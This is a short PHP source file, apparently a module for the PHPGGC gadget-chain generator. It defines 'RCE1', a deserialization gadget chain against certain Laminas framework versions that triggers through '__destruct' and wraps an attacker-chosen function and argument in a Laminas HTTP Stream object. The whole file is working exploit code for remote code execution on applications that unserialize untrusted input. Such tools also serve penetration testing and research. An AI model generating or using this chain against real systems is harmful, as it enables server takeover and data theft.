<?php

namespace GadgetChain\Laminas;

class RCE1 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '2.1.5 <= 2.5.3 & 2.11.2';
    public static $vector = '__destruct';
    public static $author = 'CyanM0un';

    public function generate(array $parameters)
    {
	    $function = $parameters['function'];
        $parameter = $parameters['parameter'];

        return new \Laminas\Http\Response\Stream($function,$parameter);
    }
}
?>
